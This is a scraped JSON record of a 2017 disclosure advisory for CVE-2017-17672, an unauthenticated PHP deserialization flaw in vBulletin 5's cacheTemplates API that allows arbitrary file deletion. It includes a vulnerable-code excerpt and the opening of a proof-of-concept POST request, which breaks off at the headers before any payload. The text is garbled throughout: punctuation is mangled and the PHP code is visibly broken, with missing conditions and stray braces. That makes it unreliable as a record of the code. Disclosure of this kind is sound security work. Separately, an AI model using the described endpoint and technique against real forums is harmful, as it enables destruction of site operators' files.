{
    "text": "vul_name : vBulletin 5 cacheTemplates Unauthenticated Remote Arbitrary File Deletion ， vul_cve : CVE-2017-17672 ， vul_poc :  # SSD Advisory vBulletin cacheTemplates Unauthenticated Remote Arbitrary File Deletion ， Source :  ， Vulnerability Summary ， The following advisory describes a unauthenticated deserialization vulnerability that leads to arbitrary delete files and , under certain circumstances , code execution found in vBulletin version 5. ， vBulletin , also known as vB , is a widespread proprietary Internet forum software package developed by vBulletin Solutions , Inc. , based on PHP and MySQL database server. vBulletin powers many of the largest social sites on the web , with over 100 , 000 sites built on it , including Fortune 500 and Alexa Top 1M companies websites and forums. According to the latest W3Techs1 statistics , vBulletin version 4 holds more than 55% of the vBulletin market share , while version 3 and 5 divide the remaining percentage. ， Credit ， A security researcher from , TRUEL IT (  @ truel_it )  , has reported this vulnerability to Beyond Securitys SecuriTeam Secure Disclosure program. ， Vendor response ， We tried to contact vBulletin since November 21 2017 , repeated attempts to establish contact went unanswered. At this time there is no solution or workaround for these vulnerabilities. ， CVE : CVE-2017-17672 ， Vulnerability details ， Unsafe usage of PHPs unserialize (  ) on user-supplied input allows an unauthenticated attacker to delete arbitrary files and , under certain circumstances , execute arbitrary code on a vBulletin installation. ， vB_Library_Templates cacheTemplates (  ) function , which is an publicly exposed API which allows to fetch information on a set of given templates from the database in order to store them inside a cache variable. ， File core/vb/api/template.php function cacheTemplates (  )  :  ， ` ， public function cacheTemplates (  $ templates ,  $ templateidlist ,  $ skip_bbcode_style = false ,  ，  $ force_set = false )  ， { ， ` ， Lets take a look at $ templateidlist core/vb/library/template.php function cacheTemplates (  )  :  ， ` ， public function cacheTemplates (  $ templates ,  $ templateidlist ,  $ skip_bbcode_style = false ,  ，  $ force_set = false )  ， { ，  $ vboptions = vB : getDatastore (  )  ， / vB_Library_Style : switchCssStyle (  ) may pass us a templateidlist that's already unserialized. ， { ，  $ templateidlist = unserialize (  $ templateidlist )  ;  ， } ， foreach (  $ templates AS $ template )  ， { ， { ，  $ templateids [  ] = intval (  $ templateidlist [  $ template ]  )  ;  ， } ， } ， { ，  $ temps = vB : getDbAssertor ( array ( 'title' , 'textonly' , 'template_un' , 'template' )  ;  ， / cache templates ， foreach (  $ temps as $ temp )  ， { ， { ， self :  $ templatecache [ \" $ temp [ title ] \" ] = $ this ;  ， } ， } ， } ， { ， self :  $ bbcode_style = array (  ， 'code' => & $ templateassoc [ 'bbcode_code_styleid' ]  ,  ， 'html' => & $ templateassoc [ 'bbcode_html_styleid' ]  ,  ， 'php' => & $ templateassoc [ 'bbcode_php_styleid' ]  ,  ， 'quote' => & $ templateassoc [ 'bbcode_quote_styleid' ]  ，  )  ;  ， } ， } ， ` ，  $ temnplateidlist variable , which can come directly from user-input , is directly supplied to unserialize (  )  , resulting in an arbitrary deserialization primitive. ， Proof of Concept ， By sending the following POST request an unauthenticated attacker can delete files from the victims server ， ` ， POST /vb533/ajax/api/template/cacheTemplates HTTP/1.1 ， Host : vb533.test ， Pragma : no-cache ， Cache-Control : no-cache ， User-Agent : Mozilla/5.0 ( Macintosh ; Intel Mac OS X 10_13_0 ) AppleWebKit/537.36 ( KHTML , like ， Gecko ) Chrome/61.0.3163.100 Safari/537.36 ， Upgrade-Insecure-Requests : 1",
    "time": "2017.12.19"
}